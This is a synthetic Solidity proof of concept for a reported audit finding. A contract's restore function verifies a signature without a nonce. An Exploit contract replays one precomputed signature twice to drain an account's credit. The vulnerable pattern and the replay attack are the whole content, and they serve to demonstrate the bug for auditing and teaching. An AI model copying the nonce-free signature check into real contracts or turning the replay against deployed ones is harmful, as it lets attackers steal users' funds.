// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Overprotocol — RestoreData has no nonce (Spearbit, May 2024, finding #40983, Dtheo).
    SYNTHETIC, cheatcode-free. One precomputed signature is accepted twice (@> VULN).
    The account credited 200. Each restore moves 100 to the server. The second
    restore is the replay. A nonce stops that second move. */

contract MoveToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract RestorationDesk {
    MoveToken public immutable token;
    mapping(address => uint256) public credit;

    constructor(MoveToken token_) {
        token = token_;
    }

    function creditAccount(address account, uint256 amount) external {
        credit[account] = amount;
    }

    function restore(address account, uint256 amount, bytes calldata sig) external {
        bytes32 hash = keccak256(abi.encode(account, amount));
        require(_recover(hash, sig) == account, "signer");
        credit[account] -= amount;
        // @> VULN: RestoreData has no nonce and is not rooted to a single RestorationTX.
        token.transfer(msg.sender, amount);
    }

    function _recover(bytes32 hash, bytes calldata sig) internal pure returns (address) {
        require(sig.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Exploit {
    MoveToken public token; // nonce 1
    RestorationDesk public desk; // nonce 2

    // Anvil account 1. Digest = keccak256(abi.encode(account, 100)), signed raw (no eth prefix).
    address public constant USER = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    bytes32 public constant R = 0x6d664fe8c1b2a589b2a342cf747fe9c374116ecf5011466b9467bd68d432901e;
    bytes32 public constant S = 0x76110b80b3e36b3b24d005da2b44d41210b51cc1b9f0bac39ff35a5e19bc0732;
    uint8 public constant V = 27;

    uint256 public firstMoved;
    uint256 public secondMoved;

    constructor() {
        token = new MoveToken();
        desk = new RestorationDesk(token);
    }

    function run() external {
        token.mint(address(desk), 200);
        desk.creditAccount(USER, 200);
        bytes memory sig = abi.encodePacked(R, S, V);
        desk.restore(USER, 100, sig);
        firstMoved = token.balanceOf(address(this));
        require(firstMoved == 100, "first restore moves 100");
        desk.restore(USER, 100, sig);
        secondMoved = token.balanceOf(address(this)) - firstMoved;
        require(secondMoved == 100, "second restore moves another 100");
        require(desk.credit(USER) == 0, "account drained");
        require(token.balanceOf(address(this)) == 200, "server holds 200");
    }
}
